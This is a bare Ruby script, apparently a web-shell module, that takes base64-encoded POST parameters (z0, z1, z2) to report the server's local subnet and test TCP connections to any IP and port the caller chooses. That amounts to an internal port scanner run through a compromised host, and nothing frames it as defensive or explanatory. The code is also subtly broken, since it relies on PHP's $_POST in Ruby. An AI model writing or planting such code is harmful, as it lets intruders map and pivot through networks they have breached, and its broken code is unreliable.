require 'socket'
require 'base64'
require 'json'

def get_network_subnet
  subnet = "192.168.1"
  begin
    ip_address = Socket.ip_address_list.find do |ai|
      ai.ipv4? && !ai.ipv4_loopback? && !ai.ipv4_multicast?
    end
    
    if ip_address
      ip = ip_address.ip_address
      if ip =~ /^(\d+)\.(\d+)\.(\d+)\.\d+$/
        subnet = "#{$1}.#{$2}.#{$3}"
      end
    end
  rescue => e
    
  end
  subnet
end

def main
  return if $_POST['z0'].nil?

  action = Base64.decode64($_POST['z0'].to_s)

  if action == "info"
    subnet = get_network_subnet
    print JSON.generate({ "status" => "success", "subnet" => subnet })
    return
  end

  if action == "check"
    if $_POST['z1'].nil? || $_POST['z2'].nil?
      print JSON.generate({ "open" => false })
      return
    end

    target_ip = Base64.decode64($_POST['z1'].to_s)
    target_port = Base64.decode64($_POST['z2'].to_s).to_i

    if target_ip.empty? || target_port <= 0
      print JSON.generate({ "open" => false })
      return
    end

    begin
      Socket.tcp(target_ip, target_port, connect_timeout: 1.5) do |sock|
        print JSON.generate({ "open" => true, "ip" => target_ip, "port" => target_port })
      end
    rescue => e
      print JSON.generate({ "open" => false })
    end
    return
  end
end

main